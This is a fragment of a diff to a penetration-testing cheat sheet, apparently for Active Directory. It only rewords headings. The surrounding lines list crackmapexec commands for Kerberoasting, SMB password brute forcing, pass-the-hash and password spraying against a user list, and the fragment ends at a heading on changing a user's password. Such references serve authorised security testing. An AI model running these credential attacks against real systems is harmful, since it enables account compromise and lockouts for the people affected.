@@ -16,11 +16,11 @@ TGS-REP (Kerberoasting):
 `crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` (creds)
 
 ## NetBIOS & SMB
-Brute force - WILL LOCKOUT USER:
+Brute force passwords - WILL LOCKOUT USER:
 `crackmapexec smb <IP> -u <USER> -p <PASSLIST>`
 `crackmapexec smb <IP> -u <USER> -H <HASHES>`
 
-Check password for userlist:
+Check password for users in list:
 `crackmapexec smb <IP> -u <USERLIST> -p <PASS>`
 
 Change password user:
